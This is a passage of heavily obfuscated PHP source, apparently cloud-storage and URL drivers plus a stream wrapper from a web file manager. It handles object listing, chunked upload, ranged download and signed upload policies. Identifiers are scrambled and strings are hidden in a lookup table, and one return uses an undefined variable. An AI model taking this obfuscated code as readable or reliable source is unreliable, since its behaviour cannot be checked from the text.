!0; if (empty($”ÛÀóµŸ)) { $”ÛÀóµŸ = $this->objectMeta($¹äÕ›¦Ã); if (!$”ÛÀóµŸ) { return $®ùÈ›Ùæ; } } $®ùÈ›Ùæ[$üß’²”ã[201]] = intval($”ÛÀóµŸ[$üß’²”ã[1483]]); $®ùÈ›Ùæ[$üß’²”ã[85]] = intval($”ÛÀóµŸ[$üß’²”ã[1484]]); return $®ùÈ›Ùæ; } private function listObjs($ôÌ³ÜºÊ, $”Ìê¦‘‰ = 0, $¶¶ôØ = 1000) { $Û³„×½ =& $_SERVER[¹ş¤¶ĞÖ]; $°’÷”÷ = array($Û³„×½[1485], $Û³„×½[1486] . $¶¶ôØ); if ($”Ìê¦‘‰) { $°’÷”÷[] = $Û³„×½[1487] . $”Ìê¦‘‰; } $ãÙ¿åê = $this->ussRequest($ôÌ³ÜºÊ, $Û³„×½[230], !1, $°’÷”÷); return !$ãÙ¿åê[$Û³„×½[1245]] ? !1 : $ãÙ¿åê[$Û³„×½[1235]]; } private function fileList($¾‘ö£, &$Ä¿ÂÑı«, &$¢™ò‘ßÓ, $ˆˆó’ç = false) { $·¥ØŞ¥± =& $_SERVER[¹ş¤¶ĞÖ]; $­ŠÁ˜Óß = $·¥ØŞ¥±[12]; $îìö‡òî = 1000; $™‰†ÓØ¼ = rtrim($¾‘ö£, $·¥ØŞ¥±[8]) . $·¥ØŞ¥±[8]; while (!0) { check_abort(); $¼öÉ„ = $this->listObjs($¾‘ö£, $­ŠÁ˜Óß, $îìö‡òî); if (!$¼öÉ„) { return !1; } $­ŠÁ˜Óß = isset($¼öÉ„[$·¥ØŞ¥±[1488]]) ? $¼öÉ„[$·¥ØŞ¥±[1488]] : $·¥ØŞ¥±[12]; $ºç¡¯•š = isset($¼öÉ„[$·¥ØŞ¥±[1489]]) ? $¼öÉ„[$·¥ØŞ¥±[1489]] : array(); foreach ($ºç¡¯•š as $ĞşµÅÜ) { $µÔê¢Ø = $ĞşµÅÜ[$·¥ØŞ¥±[33]] == $·¥ØŞ¥±[75] ? !0 : !1; $ë²ğƒ§¾ = ltrim($™‰†ÓØ¼ . $ĞşµÅÜ[$·¥ØŞ¥±[32]], $·¥ØŞ¥±[8]) . ($µÔê¢Ø ? $·¥ØŞ¥±[8] : $·¥ØŞ¥±[12]); $¼õşŠËÔ = array($·¥ØŞ¥±[32] => $ë²ğƒ§¾, $·¥ØŞ¥±[33] => $µÔê¢Ø ? $·¥ØŞ¥±[75] : $·¥ØŞ¥±[200], $·¥ØŞ¥±[76] => $ĞşµÅÜ[$·¥ØŞ¥±[366]], $·¥ØŞ¥±[1484] => $ĞşµÅÜ[$·¥ØŞ¥±[1490]]); $this->cacheMethodInfoSet($ë²ğƒ§¾, $µÔê¢Ø, $¼õşŠËÔ); if ($µÔê¢Ø) { $Ä¿ÂÑı«[] = $ë²ğƒ§¾; if ($ˆˆó’ç) { $this->fileList($ë²ğƒ§¾, $Ä¿ÂÑı«, $¢™ò‘ßÓ, $ˆˆó’ç); } continue; } $¢™ò‘ßÓ[] = $¼õşŠËÔ; } if (count($ºç¡¯•š) < $îìö‡òî) { break; } } $this->cacheMethodInfoSet($¾‘ö£, !0); } public function listPath($¨¨¹îæû, $«·š‚å  = false) { $ºŒãõ =& $_SERVER[¹ş¤¶ĞÖ]; $šÈãÀ† = $Æâ‚ĞË = array(); $this->fileList($¨¨¹îæû, $šÈãÀ†, $Æâ‚ĞË); foreach ($šÈãÀ† as $³§·ìî => $çòÏÕˆÇ) { $šÈãÀ†[$³§·ìî] = $this->folderInfo($çòÏÕˆÇ, $«·š‚å ); } foreach ($Æâ‚ĞË as $³§·ìî => $çòÏÕˆÇ) { $Æâ‚ĞË[$³§·ìî] = $this->fileInfo($çòÏÕˆÇ[$ºŒãõ[32]], $«·š‚å , $çòÏÕˆÇ); } return array($ºŒãõ[82] => $šÈãÀ†, $ºŒãõ[83] => $Æâ‚ĞË); } public function has($üá¾Õ÷¹, $ªí¸¿Øå = false, $µüÍŞû = true) { $ş’×ø¥æ =& $_SERVER[¹ş¤¶ĞÖ]; $€ŠÈÁŞ = $ş’×ø¥æ[12]; $ù©ıŞ‚ = 500; $ªú¾ğÉ = 0; $‚«á²Ó™ = 0; $ñÔ²©Øœ = rtrim($üá¾Õ÷¹, $ş’×ø¥æ[8]) . $ş’×ø¥æ[8]; while (!0) { check_abort(); $±„¨È²± = $this->listObjs($üá¾Õ÷¹, $€ŠÈÁŞ, $ù©ıŞ‚); if (!$±„¨È²±) { return !1; } $€ŠÈÁŞ = isset($±„¨È²±[$ş’×ø¥æ[1488]]) ? $±„¨È²±[$ş’×ø¥æ[1488]] : $ş’×ø¥æ[12]; $÷‚€Æ‡è = isset($±„¨È²±[$ş’×ø¥æ[1489]]) ? $±„¨È²±[$ş’×ø¥æ[1489]] : array(); if (empty($÷‚€Æ‡è)) { break; } $æ¿£ôá = array_filter($÷‚€Æ‡è, function ($õÑó‡“¿) { $§µ¢¦èò =& $_SERVER[¹ş¤¶ĞÖ]; return $õÑó‡“¿[$§µ¢¦èò[33]] == $§µ¢¦èò[75]; }); $´èµİïó = count($÷‚€Æ‡è); $æ¿£ôá = count($æ¿£ôá); $¼ˆ†¶§î = $´èµİïó - $æ¿£ôá; if ($ªí¸¿Øå) { $‚«á²Ó™ += $æ¿£ôá; $ªú¾ğÉ += $¼ˆ†¶§î; if ($´èµİïó < $ù©ıŞ‚) { break; } continue; } if ($µüÍŞû) { if ($¼ˆ†¶§î) { return !0; } } else { if ($æ¿£ôá) { return !0; } } if ($´èµİïó < $ù©ıŞ‚) { break; } } if ($ªí¸¿Øå) { return array($ş’×ø¥æ[207] => $ªú¾ğÉ, $ş’×ø¥æ[208] => $‚«á²Ó™); } return !1; } public function listAll($É¬Şä¿ª) { $àÅÇß®‰ =& $_SERVER[¹ş¤¶ĞÖ]; $ëåÇÔéİ = $‡Â©’‚ = array(); $this->fileList($É¬Şä¿ª, $ëåÇÔéİ, $‡Â©’‚, !0); $ì¾–ØÒë = array_to_keyvalue($‡Â©’‚, $àÅÇß®‰[32]); foreach ($ëåÇÔéİ as $·¸Ñ ûŠ) { if (is_string($·¸Ñ ûŠ)) { $ì¾–ØÒë[$·¸Ñ ûŠ] = array($àÅÇß®‰[76] => 0); } } return $this->listAllFiles($É¬Şä¿ª, $ì¾–ØÒë); } public function canRead($Ï¢·ÚñŸ) { return $this->exist($Ï¢·ÚñŸ) ? !0 : !1; } public function canWrite($‡•ÜßÓ) { return $this->exist($‡•ÜßÓ) ? !0 : !1; } public function getContent($¸¦­ÁàÈ) { return $this->fileSubstr($¸¦­ÁàÈ, 0, -1); } public function setContent($Ş´ÀÛœ, $å÷äÉ§£ = '') { $¥°š‘Å =& $_SERVER[¹ş¤¶ĞÖ]; if (!$å÷äÉ§£) { $‹¡ëòÇë = $this->ussRequest($Ş´ÀÛœ, $¥°š‘Å[226]); return $‹¡ëòÇë[$¥°š‘Å[1245]]; } $Ó°êäóÍ = $this->tempFile($this->pathThis($Ş´ÀÛœ)); file_put_contents($Ó°êäóÍ, $å÷äÉ§£); if ($this->upload($Ş´ÀÛœ, $Ó°êäóÍ)) { $this->tempFileRemve($Ó°êäóÍ); return !0; } return !1; } public function fileSubstr($æõáº¡, $š¨ƒ”şª, $İÄ°äÙ) { $‡Ó’ùäŒ =& $_SERVER[¹ş¤¶ĞÖ]; if (!($˜óÈÕ–ä = $this->link($æõáº¡))) { return !1; } $ÖåôçÃ = !1; if ($İÄ°äÙ > 0) { $èÃÜâÆ = $š¨ƒ”şª + $İÄ°äÙ - 1; $ÖåôçÃ = array($‡Ó’ùäŒ[1451] . $š¨ƒ”şª . $‡Ó’ùäŒ[415] . $èÃÜâÆ); } $úóˆ·ìŸ = url_request($˜óÈÕ–ä, $‡Ó’ùäŒ[230], !1, $ÖåôçÃ); return $úóˆ·ìŸ[$‡Ó’ùäŒ[776]] ? $úóˆ·ìŸ[$‡Ó’ùäŒ[1235]] : !1; } public function upload($ôØ‡¾ëå, $óú‰ª¾, $¯àœú’¦ = false, $›Î‰íÏ… = REPEAT_REPLACE) { $ºå®äÄñ =& $_SERVER[¹ş¤¶ĞÖ]; $‘úÓšô = IO::size($óú‰ª¾); if ($‘úÓšô <= 1024 * 1024 * 200) { $„º–é®  = array($ºå®äÄñ[1491] . $óú‰ª¾); $‡…®éİ› = $this->ussRequest($ôØ‡¾ëå, $ºå®äÄñ[228], $„º–é® ); return $‡…®éİ›[$ºå®äÄñ[1245]] ? $this->getPathOuter($ôØ‡¾ëå) : !1; } $·Š½Ã“Ÿ = 1024 * 1024 * 10; $¨§ßÈŒ‹ = array($ºå®äÄñ[1492], $ºå®äÄñ[1493] . $‘úÓšô, $ºå®äÄñ[1494], $ºå®äÄñ[1495] . $·Š½Ã“Ÿ); $‡…®éİ› = $this->ussRequest($ôØ‡¾ëå, $ºå®äÄñ[228], !1, $¨§ßÈŒ‹); if (!$‡…®éİ›[$ºå®äÄñ[1245]]) { return !1; } $ê”îÃõª = $‡…®éİ›[$ºå®äÄñ[1235]]; $™·Õ‰íì = 0; $îßşâ”¼ = $ê”îÃõª[$ºå®äÄñ[1496]]; $ëºé›÷ = fopen($óú‰ª¾, $ºå®äÄñ[1400]); if (!$ëºé›÷) { return !1; } do { $Ê”¬ò÷û = $ê”îÃõª[$ºå®äÄñ[1497]]; fseek_64($ëºé›÷, $™·Õ‰íì); $Ğ«ÇŞƒª = fread($ëºé›÷, $Ê”¬ò÷û); $ëş‹‘¤ç = 0; do { $ëş‹‘¤ç++; $ê”îÃõª = $this->uploadPart($ôØ‡¾ëå, $ê”îÃõª, $Ğ«ÇŞƒª); } while (!$ê”îÃõª && $ëş‹‘¤ç < 3); if (!$ê”îÃõª) { return !1; } $îßşâ”¼ = $ê”îÃõª[$ºå®äÄñ[1496]]; $™·Õ‰íì += $Ê”¬ò÷û; } while ($îßşâ”¼ != -1); fclose($ëºé›÷); $¨§ßÈŒ‹ = array($ºå®äÄñ[1498], $ºå®äÄñ[1499] . $ê”îÃõª[$ºå®äÄñ[1500]], $ºå®äÄñ[1494]); $‡…®éİ› = $this->ussRequest($ôØ‡¾ëå, $ºå®äÄñ[228], !1, $¨§ßÈŒ‹); return $‡…®éİ›[$ºå®äÄñ[1245]] ? $this->getPathOuter($‚‚ÎØ) : !1; } private function uploadPart($ú…ë­‘Ş, $Û˜ŒÓº›, &$¦š§ËÈ) { $†ŒÜª‘¶ =& $_SERVER[¹ş¤¶ĞÖ]; $¾‚× = array($†ŒÜª‘¶[1501], $†ŒÜª‘¶[1499] . $Û˜ŒÓº›[$†ŒÜª‘¶[1500]], $†ŒÜª‘¶[1502] . $Û˜ŒÓº›[$†ŒÜª‘¶[1496]], $†ŒÜª‘¶[142] . $Û˜ŒÓº›[$†ŒÜª‘¶[1497]]); $’œÓ¥Ù = $this->ussRequest($ú…ë­‘Ş, $†ŒÜª‘¶[228], $¦š§ËÈ, $¾‚×); return !$’œÓ¥Ù[$†ŒÜª‘¶[1245]] ? $’œÓ¥Ù[$†ŒÜª‘¶[1245]] : $’œÓ¥Ù[$†ŒÜª‘¶[1235]]; } public function uploadFormData($·¡øÃœ, $øË†İ±Ò = 3600) { return $this->uploadPolicy($·¡øÃœ, $øË†İ±Ò); } public function multiUploadFormData($™†°º–­, $äÄÃšÔÓ = 3600) { $¡üùú­í =& $_SERVER[¹ş¤¶ĞÖ]; $³ÅÇÖ¨± = (int) $GLOBALS[$¡üùú­í[7]][$¡üùú­í[76]]; return $this->uploadPolicy($™†°º–­, $äÄÃšÔÓ, $³ÅÇÖ¨±); } private function uploadPolicy($®ãØçä, $Ï…×ÂÜÙ = 3600, $ÄÉÕõ¦© = 0) { $‚˜£´ü¬ =& $_SERVER[¹ş¤¶ĞÖ]; $óüÄª×‚ = $‚˜£´ü¬[8] . $this->bucket; $¯²Ø¶Ã = gmdate($‚˜£´ü¬[1436]); $†æ‚§® = array($‚˜£´ü¬[1503] => $this->bucket, $‚˜£´ü¬[1504] => $®ãØçä, $‚˜£´ü¬[1505] => time() + $Ï…×ÂÜÙ, $‚˜£´ü¬[1506] => $¯²Ø¶Ã); if ($ÄÉÕõ¦©) { $†æ‚§®[$‚˜£´ü¬[1416]] = $ÄÉÕõ¦©; } $çõ¿Œ×Ç = base64_encode(json_encode($†æ‚§®)); $—ƒ™›ÎÉ = base64_encode(hash_hmac($‚˜£´ü¬[1473], "\x50\x4f\123\x54\x26{$óüÄª×‚}\46{$¯²Ø¶Ã}\x26{$çõ¿Œ×Ç}", md5("{$this->userpass}"), !0)); $åÖ ïìû = array($‚˜£´ü¬[261] => $çõ¿Œ×Ç, $‚˜£´ü¬[1507] => "\125\x50\x59\x55\x4e\x20{$this->username}\x3a{$—ƒ™›ÎÉ}", $‚˜£´ü¬[182] => $this->endpoint . $óüÄª×‚); return $åÖ ïìû; } public function download($™õ¯‚…ñ, $µœ­Óø) { $òÍ‰ÜÛÈ = IO::getPathInner(IO::mkfile($µœ­Óø)); if (!($êÍİÖğ‚ = $this->link($™õ¯‚…ñ))) { return !1; } $¿‚¦ÖšŠ = 0; $‰¥ŒÂûŒ = 1024 * 200; $ú¯—–í· = fopen($òÍ‰ÜÛÈ, $_SERVER[¹ş¤¶ĞÖ][1457]); while (!0) { $¾âİî‰Ø = $this->fileSubstr($™õ¯‚…ñ, $¿‚¦ÖšŠ, $‰¥ŒÂûŒ); if ($¾âİî‰Ø === !1) { return !1; } fwrite($ú¯—–í·, $¾âİî‰Ø); $¿‚¦ÖšŠ += $‰¥ŒÂûŒ; if (strlen($¾âİî‰Ø) < $‰¥ŒÂûŒ) { break; } } fclose($ú¯—–í·); return $µœ­Óø; } public function link($…­©ƒ§€, $ùÉË±å¡ = array()) { $‡¸à²Õ‚ =& $_SERVER[¹ş¤¶ĞÖ]; $…­©ƒ§€ = trim($…­©ƒ§€, $‡¸à²Õ‚[8]); if (!empty($this->token)) { $Í£¸÷ = strtotime(date($‡¸à²Õ‚[1508])); $›’íÆøˆ = substr(md5($this->token . $‡¸à²Õ‚[313] . $Í£¸÷ . $‡¸à²Õ‚[1509] . $…­©ƒ§€), 12, 8) . $Í£¸÷; $ùÉË±å¡[] = $‡¸à²Õ‚[1510] . $›’íÆøˆ; } $³“ÆÆš = !empty($ùÉË±å¡) ? $‡¸à²Õ‚[73] . implode($‡¸à²Õ‚[313], $ùÉË±å¡) : $‡¸à²Õ‚[12]; return $this->getHost() . $‡¸à²Õ‚[8] . $…­©ƒ§€ . $³“ÆÆš; } public function fileOut($“³œ£¿‘, $şà¤ˆçó = false, $Ú³«Ğ¿ = false, $‡©Óà× = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($“³œ£¿‘, $şà¤ˆçó, $Ú³«Ğ¿, $‡©Óà×); } if (!$Ú³«Ğ¿) { $Ú³«Ğ¿ = $this->pathThis($“³œ£¿‘); } $Ï¥µïŠ… = $şà¤ˆçó ? array($_SERVER[¹ş¤¶ĞÖ][1511] . rawurlencode($Ú³«Ğ¿)) : array(); $¼¡Ñ’€é = $this->link($“³œ£¿‘, $Ï¥µïŠ…); $this->fileOutLink($¼¡Ñ’€é); } public function fileOutServer($Ş„­ ÓÉ, $‹ƒüŠÒ = false, $Æ«öÁ·³ = false, $ı­óÍ½© = '') { parent::fileOut($Ş„­ ÓÉ, $‹ƒüŠÒ, $Æ«öÁ·³, $ı­óÍ½©); } public function fileOutImage($³Õù¶Õ, $˜áˆÅÙ = 250) { $³¤Í›Ğ† = $this->link($³Õù¶Õ . $_SERVER[¹ş¤¶ĞÖ][1512] . $˜áˆÅÙ); $this->fileOutLink($³¤Í›Ğ†); } public function fileOutImageServer($ç¦ÜÒáµ, $—ù¡©¼ = 250) { parent::fileOutImage($ç¦ÜÒáµ, $—ù¡©¼); } public function hashMd5($ÚºÂ­Ä) { $óúø×·ç =& $_SERVER[¹ş¤¶ĞÖ]; $„ª›£ñà = $this->_objectMeta($ÚºÂ­Ä); return isset($„ª›£ñà[$óúø×·ç[212]]) ? $„ª›£ñà[$óúø×·ç[212]] : !1; } public function size($Í¡ÁŸöŠ) { $ÃÓÎª¿ = $this->objectMeta($Í¡ÁŸöŠ); return $ÃÓÎª¿ ? $ÃÓÎª¿[$_SERVER[¹ş¤¶ĞÖ][76]] : 0; } public function info($ßû‰¦ö) { if ($this->isFolder($ßû‰¦ö)) { return $this->folderInfo($ßû‰¦ö); } else { if ($this->isFile($ßû‰¦ö)) { return $this->fileInfo($ßû‰¦ö); } } return !1; } public function exist($ïÉšÍï) { return $this->isFile($ïÉšÍï) || $this->isFolder($ïÉšÍï); } public function isFile($Àê¸ßŒû) { return !$this->isFolder($Àê¸ßŒû) && $this->objectMeta($Àê¸ßŒû); } public function isFolder($ˆ×¥†Êš) { return $this->cacheMethod($_SERVER[¹ş¤¶ĞÖ][165], $ˆ×¥†Êš); } protected function objectMeta($ñ˜ª¢”) { return $this->cacheMethod($_SERVER[¹ş¤¶ĞÖ][167], $ñ˜ª¢”); } protected function _objectMeta($Õ™«ö) { $’ÁÓ¡ÉÚ =& $_SERVER[¹ş¤¶ĞÖ]; if ($Õ™«ö == $’ÁÓ¡ÉÚ[12] || $Õ™«ö == $’ÁÓ¡ÉÚ[8]) { return array(); } $‹“ıöñÖ = $this->ussRequest($Õ™«ö, $’ÁÓ¡ÉÚ[1513]); if (!$‹“ıöñÖ[$’ÁÓ¡ÉÚ[1245]]) { return null; } $ñ¢ıË›• = isset($‹“ıöñÖ[$’ÁÓ¡ÉÚ[1235]]) ? $‹“ıöñÖ[$’ÁÓ¡ÉÚ[1235]] : array(); if (!isset($ñ¢ıË›•[$’ÁÓ¡ÉÚ[1514]])) { return null; } $Ô‹ä¨ĞÑ = array($’ÁÓ¡ÉÚ[33] => isset($ñ¢ıË›•[$’ÁÓ¡ÉÚ[1514]]) ? $ñ¢ıË›•[$’ÁÓ¡ÉÚ[1514]] : null, $’ÁÓ¡ÉÚ[76] => isset($ñ¢ıË›•[$’ÁÓ¡ÉÚ[1515]]) ? $ñ¢ıË›•[$’ÁÓ¡ÉÚ[1515]] : null, $’ÁÓ¡ÉÚ[212] => isset($ñ¢ıË›•[$’ÁÓ¡ÉÚ[1516]]) ? $ñ¢ıË›•[$’ÁÓ¡ÉÚ[1516]] : null, $’ÁÓ¡ÉÚ[1483] => isset($ñ¢ıË›•[$’ÁÓ¡ÉÚ[1517]]) ? $ñ¢ıË›•[$’ÁÓ¡ÉÚ[1517]] : null); $Ô‹ä¨ĞÑ[$’ÁÓ¡ÉÚ[1484]] = isset($ñ¢ıË›•[$’ÁÓ¡ÉÚ[1518]]) ? strtotime($ñ¢ıË›•[$’ÁÓ¡ÉÚ[1518]]) : $Ô‹ä¨ĞÑ[$’ÁÓ¡ÉÚ[1483]]; return $Ô‹ä¨ĞÑ; } protected function _isFolder($ÃŞ§¼•‹) { $ˆõ·šÍ =& $_SERVER[¹ş¤¶ĞÖ]; if ($ÃŞ§¼•‹ == $ˆõ·šÍ[12] || $ÃŞ§¼•‹ == $ˆõ·šÍ[8]) { return !0; } $ğ©òÖç˜ = $this->_objectMeta($ÃŞ§¼•‹); return isset($ğ©òÖç˜[$ˆõ·šÍ[33]]) && $ğ©òÖç˜[$ˆõ·šÍ[33]] == $ˆõ·šÍ[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ˆïÅÏŠª = false) { } public function exist($ÈÍ»Òıœ) { $™²¿¡íØ = $this->info($ÈÍ»Òıœ); return $™²¿¡íØ[$_SERVER[¹ş¤¶ĞÖ][202]]; } public function isFile($ŞÁşØ‚) { $öÛÎ×­· = $this->info($ŞÁşØ‚); return $öÛÎ×­·[$_SERVER[¹ş¤¶ĞÖ][202]]; } public function isFolder($ôÊ¿ıü) { return !1; } public function size($º”úàŠ) { $„Œæµ¯¸ = $this->info($º”úàŠ); return $„Œæµ¯¸[$_SERVER[¹ş¤¶ĞÖ][76]]; } public function info($É£ÎØ) { return $this->infoParse($É£ÎØ); } public function infoAuth($ÑØİªÍ) { return $this->infoParse($ÑØİªÍ); } public function infoWithChildren($ùíÂ«±) { return $this->infoParse($ùíÂ«±); } public function infoFull($¥Ÿ¶Ëè) { return $this->infoParse($¥Ÿ¶Ëè); } private function infoParse($ãó°Ş¶‡) { $«´Ÿ‹À =& $_SERVER[¹ş¤¶ĞÖ]; $ÏÙÓºûï = $this->header($ãó°Ş¶‡); if (!$ÏÙÓºûï || !$ÏÙÓºûï[$«´Ÿ‹À[776]]) { return !1; } $×½ÈÎ©‹ = _get($ÏÙÓºûï, $«´Ÿ‹À[366], 0); $²íƒÂ = array($«´Ÿ‹À[32] => $ÏÙÓºûï[$«´Ÿ‹À[32]], $«´Ÿ‹À[84] => $ãó°Ş¶‡, $«´Ÿ‹À[33] => $«´Ÿ‹À[200], $«´Ÿ‹À[76] => intval($×½ÈÎ©‹), $«´Ÿ‹À[174] => get_path_ext($ÏÙÓºûï[$«´Ÿ‹À[32]]), $«´Ÿ‹À[1397] => $×½ÈÎ©‹ > 0 && $ÏÙÓºûï[$«´Ÿ‹À[1519]], $«´Ÿ‹À[1398] => !1); return $²íƒÂ; } private function header($úç¾ˆªÑ) { $ı©Ë·ÆÇ =& $_SERVER[¹ş¤¶ĞÖ]; if (isset(self::$_cacheHeader[$úç¾ˆªÑ])) { return self::$_cacheHeader[$úç¾ˆªÑ]; } $„îªäŞò = isset($GLOBALS[$ı©Ë·ÆÇ[1520]]) ? $GLOBALS[$ı©Ë·ÆÇ[1520]] : !1; $GLOBALS[$ı©Ë·ÆÇ[1520]] = !0; self::$_cacheHeader[$úç¾ˆªÑ] = url_header($úç¾ˆªÑ); $GLOBALS[$ı©Ë·ÆÇ[1520]] = $„îªäŞò; return self::$_cacheHeader[$úç¾ˆªÑ]; } public function hashSimple($ä¿€Îü, $´ÕÏÈ± = false) { $´š•´ ú =& $_SERVER[¹ş¤¶ĞÖ]; $«ã™¬±Ü = $this->info($ä¿€Îü); if (!$«ã™¬±Ü || !$«ã™¬±Ü[$´š•´ ú[202]]) { return !1; } $ÔªÀöÎ = $«ã™¬±Ü[$´š•´ ú[76]]; $‘™¼€  = 200; $ĞÖÕù± = 50; if ($ÔªÀöÎ <= $‘™¼€  * $ĞÖÕù±) { return md5($this->fileSubstr($ä¿€Îü, 0, $ÔªÀöÎ)) . $ÔªÀöÎ; } $¿ÖŸ­Ïõ = intval($ÔªÀöÎ / $ĞÖÕù±); $­¿©ŞÍø = $´š•´ ú[12]; $Ô¥¢öÚ˜ = timeFloat(); $ÄÀñìğ® = 15; for ($¢úíƒ•Ä = 0; $¢úíƒ•Ä < $ĞÖÕù±; $¢úíƒ•Ä++) { if (timeFloat() - $Ô¥¢öÚ˜ > $ÄÀñìğ®) { return !1; } $ˆ²şÊ» = $this->fileSubstr($ä¿€Îü, $¿ÖŸ­Ïõ * $¢úíƒ•Ä, $‘™¼€ ); if (!$ˆ²şÊ») { return !1; } $­¿©ŞÍø .= $ˆ²şÊ»; } $­¿©ŞÍø .= $this->fileSubstr($ä¿€Îü, $ÔªÀöÎ - $‘™¼€ , $‘™¼€ ); return md5($­¿©ŞÍø) . $ÔªÀöÎ; } public function getContent($Ğ…ïşŠ¶) { return $this->fileSubstr($Ğ…ïşŠ¶); } public function fileSubstr($ğ€ĞŸö„, $¤Øü« = 0, $ãóîİ  = -1) { $ÚÆ¸™Û¿ =& $_SERVER[¹ş¤¶ĞÖ]; $ æÙñë“ = $this->info($ğ€ĞŸö„); if (!$ æÙñë“ || !$ æÙñë“[$ÚÆ¸™Û¿[202]] && $ æÙñë“[$ÚÆ¸™Û¿[76]] > 1024 * 1024 * 10) { return !1; } if ($ãóîİ  === -1) { $ãóîİ  = $ æÙñë“[$ÚÆ¸™Û¿[76]]; } if ($ãóîİ  == 0) { return $ÚÆ¸™Û¿[12]; } $Ë¼é¸Îû = array($ÚÆ¸™Û¿[1521] . $¤Øü« . $ÚÆ¸™Û¿[808] . ($¤Øü« + $ãóîİ  - 1)); $¥Æ¦¨¨™ = url_request($ğ€ĞŸö„, $ÚÆ¸™Û¿[230], !1, $Ë¼é¸Îû, !1, !1, 30); return $¥Æ¦¨¨™[$ÚÆ¸™Û¿[1235]] ? $¥Æ¦¨¨™[$ÚÆ¸™Û¿[1235]] : $ÚÆ¸™Û¿[12]; } public function download($½£™Äû, $€ëÇ¥×Û) { Downloader::start($½£™Äû, $€ëÇ¥×Û); return $€ëÇ¥×Û; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($÷Íª¶Ì, $†Õ´°« = '') { $this->info = $this->info($÷Íª¶Ì); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¹ş¤¶ĞÖ][84]]; $this->pathOpen = $÷Íª¶Ì; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$÷Íª¶Ì])) { self::$_chunkBuffer[$÷Íª¶Ì] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ıÉİüª’) { $»î‹× = $this->fileSubstr($this->pose, $ıÉİüª’); $this->pose += strlen($»î‹×); return $»î‹×; } public function stream_tell() { return $this->pose; } public function stream_seek($¼ì‰³ø¸, $ß†ÈÎª) { $”œ¯±Í =& $_SERVER[¹ş¤¶ĞÖ]; if ($ß†ÈÎª == SEEK_SET) { $this->pose = $¼ì‰³ø¸; } else { if ($ß†ÈÎª == SEEK_CUR) { $this->pose += $¼ì‰³ø¸; } else { if ($ß†ÈÎª == SEEK_END) { $this->pose = $this->info[$”œ¯±Í[76]] + intval($¼ì‰³ø¸); } } } if ($¼ì‰³ø¸ < 0) { $this->pose = $this->info[$”œ¯±Í[76]] + $¼ì‰³ø¸; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¹ş¤¶ĞÖ][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($–åÖˆ‹, $˜Ô‰õŞœ) { $Âåê•ŸÀ =& $_SERVER[¹ş¤¶ĞÖ]; $ñ´ç–’¨ = $this->info($–åÖˆ‹); return array($Âåê•ŸÀ[1522] => 0, $Âåê•ŸÀ[1523] => 0, $Âåê•ŸÀ[16] => 32768 + 511, $Âåê•ŸÀ[1524] => 0, $Âåê•ŸÀ[1525] => 0, $Âåê•ŸÀ[1526] => 0, $Âåê•ŸÀ[1527] => 0, $Âåê•ŸÀ[76] => $ñ´ç–’¨[$Âåê•ŸÀ[76]], $Âåê•ŸÀ[1528] => $ñ´ç–’¨[$Âåê•ŸÀ[1396]], $Âåê•ŸÀ[1484] => $ñ´ç–’¨[$Âåê•ŸÀ[85]], $Âåê•ŸÀ[1483] => $ñ´ç–’¨[$Âåê•ŸÀ[201]], $Âåê•ŸÀ[1529] => 0, $Âåê•ŸÀ[1530] => 0); } static $fileInfo = array(); public function info($ÄÙËŒ–) { $´´¨¯¡† = $_SERVER[¹ş¤¶ĞÖ][1531]; if (isset(self::$fileInfo[$ÄÙËŒ–])) { return self::$fileInfo[$ÄÙËŒ–]; } if (substr($ÄÙËŒ–, 0, strlen($´´¨¯¡†)) != $´´¨¯¡†) { return !1; } self::$fileInfo[$ÄÙËŒ–] = IO::info(substr($ÄÙËŒ–, strlen($´´¨¯¡†))); return self::$fileInfo[$ÄÙËŒ–]; } public static function read($êÍËüäõ, $ÎÄæšÎç, $¾ÄÅ»èÆ) { if (!isset(self::$_fopenCache[$êÍËüäõ])) { $­ÕƒœàË = new StreamWrapperIO(); $­ÕƒœàË->stream_open($êÍËüäõ); self::$_fopenCache[$êÍËüäõ] = $­ÕƒœàË; } $­ÕƒœàË = self::$_fopenCache[$êÍËüäõ]; return $­ÕƒœàË->fileSubstr($ÎÄæšÎç, $¾ÄÅ»èÆ); } public static function _read($«Î“ÌÖ¢, $ÆƒŞœêé, $½Œ«ùùË) { $½ÅûĞ =& $_SERVER[¹ş¤¶ĞÖ]; $äŸÙÄ½÷ = fopen($«Î“ÌÖ¢, $½ÅûĞ[1400]); if (!$äŸÙÄ½÷) { return $½ÅûĞ[12]; } $şÙ¤°õŞ = 8192; fseek($äŸÙÄ½÷, $ÆƒŞœêé, SEEK_SET); $€…È¹¥Ë = $½ÅûĞ[12]; $ôíŸæ» = 0; while ($ôíŸæ» < $½Œ«ùùË) { $Ğ†­Ô¼¦ = min($şÙ¤°õŞ, $½Œ«ùùË - $ôíŸæ»); $€…È¹¥Ë .= fread($äŸÙÄ½÷, $Ğ†­Ô¼¦); $ôíŸæ» += $Ğ†­Ô¼¦; } fclose($äŸÙÄ½÷); return $€…È¹¥Ë; } public function fileSubstr($íç¾ÁŸ, $Ã‡ÀæúÓ) { $ûâ´×·‹ =& $_SERVER[¹ş¤¶ĞÖ]; $”ÛÉ‹ï = $this->info[$ûâ´×·‹[76]]; $ÏÏ’‡çÌ = $íç¾ÁŸ; $Œ–­¬ú = $Ã‡ÀæúÓ; if ($íç¾ÁŸ < 0) { $íç¾ÁŸ = $”ÛÉ‹ï + $íç¾ÁŸ; } if ($Ã‡ÀæúÓ === !1) { $Ã‡ÀæúÓ = $”ÛÉ‹ï - $íç¾ÁŸ; } if ($íç¾ÁŸ + $Ã‡ÀæúÓ > $”ÛÉ‹ï) { $Ã‡ÀæúÓ = $”ÛÉ‹ï - $íç¾ÁŸ; } if ($Ã‡ÀæúÓ <= 0) { return $ûâ´×·‹[12]; } if ($íç¾ÁŸ < 0 || $íç¾ÁŸ >= $”ÛÉ‹ï || $Ã‡ÀæúÓ <= 0 || $Ã‡ÀæúÓ 